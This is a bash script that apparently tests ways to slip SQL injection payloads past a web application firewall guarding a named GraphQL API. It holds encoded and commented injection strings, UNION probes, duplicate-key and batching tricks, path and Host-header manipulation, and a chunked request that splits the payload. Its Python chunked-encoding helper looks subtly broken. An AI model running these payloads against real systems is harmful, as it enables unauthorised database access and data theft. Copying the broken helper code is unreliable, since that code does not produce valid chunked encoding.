#!/bin/bash
# Matrice WAF bypass : meme payload SQLi, encodages differents.
EP=https://bugsecure-api.senintel.sn/graphql
OUT=/tmp/waf_out
t() {
  name="$1"; shift
  code=$(curl -s -m 20 -o $OUT -w '%{http_code}' "$@")
  body=$(head -c 110 $OUT | tr -d '\n' | tr -s ' ')
  printf '%-40s %s  %s\n' "$name" "$code" "$body"
}

echo "=== A. reference ==="
cat > /tmp/b_base.json <<'EOF'
{"query":"{ __typename }"}
EOF
t "baseline {__typename}" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_base.json

cat > /tmp/b_block.json <<'EOF'
{"query":"query{ programs(filters:{search:\"' OR 1=1--\"}){ id } }"}
EOF
t "BLOCKED classic ' OR 1=1--" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_block.json

echo
echo "=== B. encodages du payload (JSON unicode escape) ==="
cat > /tmp/b_u.json <<'EOF'
{"query":"query{ programs(filters:{search:\"\u0027 OR 1=1--\"}){ id } }"}
EOF
t "unicode escape \u0027" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_u.json

cat > /tmp/b_u2.json <<'EOF'
{"query":"query{ programs(filters:{search:\"\u0027\u0020OR\u00201=1--\"}){ id } }"}
EOF
t "unicode escape espaces" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_u2.json

cat > /tmp/b_case.json <<'EOF'
{"query":"query{ programs(filters:{search:\"' oR 1=1--\"}){ id } }"}
EOF
t "casse ' oR 1=1--" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_case.json

cat > /tmp/b_cmt.json <<'EOF'
{"query":"query{ programs(filters:{search:\"'/**/OR/**/1=1--\"}){ id } }"}
EOF
t "commentaires '/**/OR/**/1" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_cmt.json

cat > /tmp/b_like.json <<'EOF'
{"query":"query{ programs(filters:{search:\"' OR 1 LIKE 1--\"}){ id } }"}
EOF
t "' OR 1 LIKE 1--" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_like.json

cat > /tmp/b_and.json <<'EOF'
{"query":"query{ programs(filters:{search:\"' AND 1=1--\"}){ id } }"}
EOF
t "' AND 1=1--" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_and.json

cat > /tmp/b_str.json <<'EOF'
{"query":"query{ programs(filters:{search:\"' OR '1'='1\"}){ id } }"}
EOF
t "' OR '1'='1" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_str.json

cat > /tmp/b_hash.json <<'EOF'
{"query":"query{ programs(filters:{search:\"' OR 1=1#\"}){ id } }"}
EOF
t "' OR 1=1#" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_hash.json

cat > /tmp/b_cblock.json <<'EOF'
{"query":"query{ programs(filters:{search:\"' OR 1=1/*\"}){ id } }"}
EOF
t "' OR 1=1/*" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_cblock.json

cat > /tmp/b_concat.json <<'EOF'
{"query":"query{ programs(filters:{search:\"'||1=1--\"}){ id } }"}
EOF
t "'||1=1--" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_concat.json

cat > /tmp/b_union.json <<'EOF'
{"query":"query{ programs(filters:{search:\"' UNION SELECT null--\"}){ id } }"}
EOF
t "' UNION SELECT null--" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_union.json

cat > /tmp/b_order.json <<'EOF'
{"query":"query{ programs(filters:{search:\"1' ORDER BY 1--\"}){ id } }"}
EOF
t "1' ORDER BY 1--" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_order.json

cat > /tmp/b_backtick.json <<'EOF'
{"query":"query{ programs(filters:{search:\"klds`\"}){ id } }"}
EOF
t "backtick" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_backtick.json

echo
echo "=== C. differences de parsing (duplicate key / batching) ==="
cat > /tmp/b_dup.json <<'EOF'
{"query":"{ __typename }","query":"query{ programs(filters:{search:\"' OR 1=1--\"}){ id } }"}
EOF
t "duplicate key (2e query)" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_dup.json

cat > /tmp/b_dup2.json <<'EOF'
{"query":"query{ programs(filters:{search:\"' OR 1=1--\"}){ id } }","query":"{ __typename }"}
EOF
t "duplicate key (1er bloque)" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_dup2.json

cat > /tmp/b_batch.json <<'EOF'
[{"query":"{ __typename }"},{"query":"query{ programs(filters:{search:\"' OR 1=1--\"}){ id } }"}]
EOF
t "batching (2e operation)" -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_batch.json

echo
echo "=== D. autres vecteurs de transport ==="
GQ="query%7Bprograms(filters%3A%7Bsearch%3A%22%27%20OR%201%3D1--%22%7D)%7Bid%7D%7D"
t "GET ?query=" -X GET "$EP?query=$GQ"
t "GET + content-type json" -X GET "$EP?query=$GQ" -H 'Content-Type: application/json'

printf 'query{ programs(filters:{search:"%s OR 1=1--"}){ id } }' "'" > /tmp/b_raw.graphql
t "Content-Type: application/graphql" -X POST "$EP" -H 'Content-Type: application/graphql' --data-binary @/tmp/b_raw.graphql

t "Content-Type: form-urlencoded" -X POST "$EP" -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "query=query{ programs(filters:{search:\"' OR 1=1--\"}){ id } }"

t "path /graphql/" -X POST "https://bugsecure-api.senintel.sn/graphql/" -H 'Content-Type: application/json' --data @/tmp/b_block.json
t "path //graphql" -X POST "https://bugsecure-api.senintel.sn//graphql" -H 'Content-Type: application/json' --data @/tmp/b_block.json
t "path /%67raphql" -X POST "https://bugsecure-api.senintel.sn/%67raphql" -H 'Content-Type: application/json' --data @/tmp/b_block.json
t "path /./graphql" -X POST "https://bugsecure-api.senintel.sn/./graphql" -H 'Content-Type: application/json' --data @/tmp/b_block.json
t "path /graphql;x=1" -X POST "https://bugsecure-api.senintel.sn/graphql;x=1" -H 'Content-Type: application/json' --data @/tmp/b_block.json
t "Host trailing dot" -X POST "$EP" -H 'Content-Type: application/json' -H 'Host: bugsecure-api.senintel.sn.' --data @/tmp/b_block.json
t "X-Forwarded-Host evil" -X POST "$EP" -H 'Content-Type: application/json' -H 'X-Forwarded-Host: evil.example' --data @/tmp/b_block.json
t "HTTP/1.0" --http1.0 -X POST "$EP" -H 'Content-Type: application/json' --data @/tmp/b_block.json

printf '{"query":"query{ programs(filters:{search:"\x27 OR 1=1--"}){ id } }"}' > /tmp/b_chunk.json
python3 - <<'PY' > /tmp/b_chunked.bin
d=open('/tmp/b_chunk.json','rb').read()
i=d.find(b"OR 1=1")
print(len(d[:i]).to_bytes(1,'big')+b"\r\n"+d[:i].decode('latin1').encode('latin1'),end='')
print(len(d[i:]).to_bytes(1,'big')+b"\r\n"+d[i:].decode('latin1').encode('latin1'),end='')
print(b"0\r\n\r\n",end='')
PY
t "chunked body (payload coupee)" -X POST "$EP" -H 'Content-Type: application/json' -H 'Transfer-Encoding: chunked' --data-binary @/tmp/b_chunked.bin
